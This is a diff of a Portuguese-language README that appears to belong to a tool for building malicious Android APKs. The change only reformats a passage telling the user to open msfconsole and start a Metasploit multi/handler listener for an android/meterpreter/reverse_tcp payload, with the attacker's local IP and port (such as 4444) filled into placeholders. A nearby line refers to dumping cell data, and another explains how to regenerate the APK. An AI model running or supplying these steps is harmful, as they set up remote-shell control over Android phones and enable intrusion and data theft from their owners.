@@ -116,14 +116,18 @@ interval_collect -a dump -c cell
 
 
 msfconsole
-E, após carregar o Metasploit, configure o listener com o comando:
 
 
-use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-set LHOST [IP_LOCAL]
-set LPORT [PORTA]
-exploit
+## E, após carregar o Metasploit, configure o listener com o comando:
+
+
+        use exploit/multi/handler
+        set payload android/meterpreter/reverse_tcp
+        set LHOST [IP_LOCAL]
+        set LPORT [PORTA]
+        exploit
+
+        
 Troque [IP_LOCAL] pelo seu IP local e [PORTA] pela porta que você configurou (como a porta 4444).
 
 ## se querer gerar de novo o apk apague os arquivos como pastas e apk's gerado
